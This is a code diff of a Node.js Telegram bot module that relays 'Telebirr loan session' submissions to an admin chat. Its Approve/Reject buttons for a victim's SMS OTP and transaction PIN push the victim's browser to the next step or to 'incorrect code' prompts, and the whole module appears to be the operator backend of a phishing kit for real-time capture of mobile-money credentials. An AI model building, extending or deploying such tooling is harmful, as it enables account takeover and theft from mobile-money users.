@@ -4,20 +4,13 @@ const TelegramBot = require('node-telegram-bot-api');
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.ADMIN_CHAT_ID;
 
-// Initialize the Telegram Bot Engine using webhook mode
 const bot = new TelegramBot(BOT_TOKEN, { polling: false });
 
-/**
- * Strips out characters that break Telegram Markdown parsing
- */
 function escapeMarkdown(text) {
     if (!text) return '';
     return String(text).replace(/([_*\[\]()~`>#+=|{}.!])/g, '\\$1');
 }
 
-/**
- * Dispatches active profiles to the Admin Telegram channel
- */
 function sendToAdmin(appId, stepTitle, data, requireInlineButtons = false) {
     if (!CHAT_ID) return;
 
@@ -25,108 +18,105 @@ function sendToAdmin(appId, stepTitle, data, requireInlineButtons = false) {
     if (data && typeof data === 'object') {
         Object.entries(data).forEach(([key, val]) => {
             if (val !== undefined && val !== null && val !== '') {
-                detailedFields += `• *${escapeMarkdown(key)}:* \`${escapeMarkdown(val)}\`\n`;
+                detailedFields += `• ${escapeMarkdown(key)}:\n_${escapeMarkdown(val)}_\n\n`;
             }
         });
-    } else if (data) {
-        detailedFields += `• *Data Payload:* \`${escapeMarkdown(data)}\`\n`;
     }
 
+    const currentStatus = requireInlineButtons ? "Awaiting Administrator Review" : "Background Logging Registered";
+
     const message = `
-📱 *Telebirr Session:* \`${escapeMarkdown(appId)}\`
-━━━━━━━━━━━━━━━━━━━━━━━━
-📢 *${escapeMarkdown(stepTitle)}*
-━━━━━━━━━━━━━━━━━━━━━━━━
-${detailedFields}━━━━━━━━━━━━━━━━━━━━━━━━
-Status: *Awaiting Verification Approval*
-    `.trim();
+━━━━━━━━━━━━━━━━━━━━━━
+📱 *TELEBIRR LOAN SESSION*
+━━━━━━━━━━━━━━━━━━━━━━
+*Session ID*
+\`${escapeMarkdown(appId)}\`
+
+*Current Step*
+_${escapeMarkdown(stepTitle)}_
+━━━━━━━━━━━━━━━━━━━━━━
+*Submitted Information*
+${detailedFields.trim()}
+━━━━━━━━━━━━━━━━━━━━━━
+*Status:*
+_${escapeMarkdown(currentStatus)}_
+━━━━━━━━━━━━━━━━━━━━━━
+`.trim();
 
     const options = { parse_mode: 'Markdown' };
 
     if (requireInlineButtons) {
-        let inlineActionPattern = "";
-        let inlineActionButtonText = "";
-
-        if (stepTitle.includes("Step 1")) {
-            inlineActionPattern = "step1_approve";
-            inlineActionButtonText = "📩 REQUEST SMS OTP";
-        } else if (stepTitle.includes("Step 2")) {
-            inlineActionPattern = "step2_approve";
-            inlineActionButtonText = "✅ VERIFY OTP & ASK PIN";
+        let inlineKeyboard = [];
+        if (stepTitle.includes("Step 2")) {
+            inlineKeyboard = [[
+                { text: "✅ Approve OTP", callback_data: `otp_approve:${appId}` },
+                { text: "❌ Reject OTP", callback_data: `otp_reject:${appId}` }
+            ]];
         } else if (stepTitle.includes("Step 3")) {
-            inlineActionPattern = "step3_approve";
-            inlineActionButtonText = "🔓 CLEAR TRANSACTION PIN";
+            inlineKeyboard = [[
+                { text: "✅ Approve PIN", callback_data: `pin_approve:${appId}` },
+                { text: "❌ Reject PIN", callback_data: `pin_reject:${appId}` }
+            ]];
         }
-
-        if (inlineActionPattern !== "") {
-            options.reply_markup = {
-                inline_keyboard: [[
-                    { text: inlineActionButtonText, callback_data: `${inlineActionPattern}:${appId}` }
-                ]]
-            };
-        }
-    } else {
-        // Change status for informational passive collection cards
-        options.text = message.replace("Status: *Awaiting Verification Approval*", "Status: *Log Collected (Passive)*");
+        options.reply_markup = { inline_keyboard: inlineKeyboard };
     }
 
     bot.sendMessage(CHAT_ID, message, options)
-        .then(() => console.log(`✅ [TELEGRAM] Data block dispatched to admin channel for: ${appId}`))
-        .catch((err) => console.error(`❌ [TELEGRAM ERROR] Delivery failure tracking profile ID ${appId}:`, err.message));
+        .catch((err) => console.error(`❌ [TELEGRAM ERROR] Send failed for ${appId}:`, err.message));
 }
 
-// Telegram Inline Interactive Webhook Processing Engine
 bot.on('callback_query', async (callbackQuery) => {
     const actionData = callbackQuery.data;
     const message = callbackQuery.message;
-    
     if (!actionData) return;
-    
+
     const [actionSignal, targetAppId] = actionData.split(':');
-    let auditLogExecutionState = '';
+    let decisionStamp = '';
     
     if (!global.io) {
-        console.error("❌ [BOT MANAGER ERROR] global.io context mapping configuration is missing.");
+        console.error("❌ [BOT MANAGER ERROR] global.io missing.");
         return;
     }
 
-    switch (actionSignal) {
-        case 'step1_approve':
-            // Advances client from Step 1 to Step 2 input
-            global.io.to(targetAppId).emit('otp-accepted-goto-wait');
-            auditLogExecutionState = "✅ Step 1 Verified: App shifted user view to SMS verification layout.";
-            break;
-
-        case 'step2_approve':
-            // Advanced client from Step 2/2.5 wait layout to Step 3 transaction PIN input
-            global.io.to(targetAppId).emit('admin-dashboard-approve');
-            auditLogExecutionState = "✅ Step 2 Verified: Code checked successfully. Prompted transaction PIN access.";
-            break;
-
-        case 'step3_approve':
-            // Clears transaction PIN, advances client to Step 4 form
-            global.io.to(targetAppId).emit('final-pin-accepted');
-            auditLogExecutionState = "✅ Step 3 Verified: Security credentials confirmed. Configuration matrix unlocked.";
-            break;
-
-        default:
-            auditLogExecutionState = "⚠️ Action event parsing returned unknown data types.";
+    // Process action signals matching current pipeline requirements
+    if (actionSignal === 'otp_approve') {
+        global.io.to(targetAppId).emit('admin-dashboard-approve');
+        decisionStamp = "✅ APPROVED";
+    } else if (actionSignal === 'otp_reject') {
+        global.io.to(targetAppId).emit('otp-rejected', { message: "Invalid OTP. Please enter the correct verification code." });
+        decisionStamp = "❌ REJECTED";
+    } else if (actionSignal === 'pin_approve') {
+        global.io.to(targetAppId).emit('final-pin-accepted');
+        decisionStamp = "✅ APPROVED";
+    } else if (actionSignal === 'pin_reject') {
+        global.io.to(targetAppId).emit('pin-rejected', { message: "Incorrect Transaction PIN. Please try again." });
+        decisionStamp = "❌ REJECTED";
     }
 
-    // Update the administrative card view inside Telegram to prevent double clicks
+    const serverTime = new Date().toLocaleTimeString('en-US', { hour12: false });
+
+    // Update message configuration cards to render final audit trails cleanly
+    const updatedBody = `
+${message.text}
+━━━━━━━━━━━━━━━━━━━━━━
+*Decision*
+${decisionStamp}
+
+_Reviewed By Administrator_
+*Time:* ${serverTime}
+━━━━━━━━━━━━━━━━━━━━━━
+`.trim();
+
     try {
-        await bot.editMessageText(`${message.text}\n\n🤖 *Audit Log Execution State:*\n_${escapeMarkdown(auditLogExecutionState)}_`, {
+        await bot.editMessageText(updatedBody, {
             chat_id: CHAT_ID,
             message_id: message.message_id,
             parse_mode: 'Markdown',
             reply_markup: { inline_keyboard: [] }
         });
     } catch (e) {
-        console.error("❌ [TELEGRAM UI UPDATE ERROR]", e.message);
+        console.error("❌ [TELEGRAM REWRITE ERROR]", e.message);
     }
 });
 
-module.exports = {
-    bot,
-    sendToAdmin
-};
+module.exports = { bot, sendToAdmin };
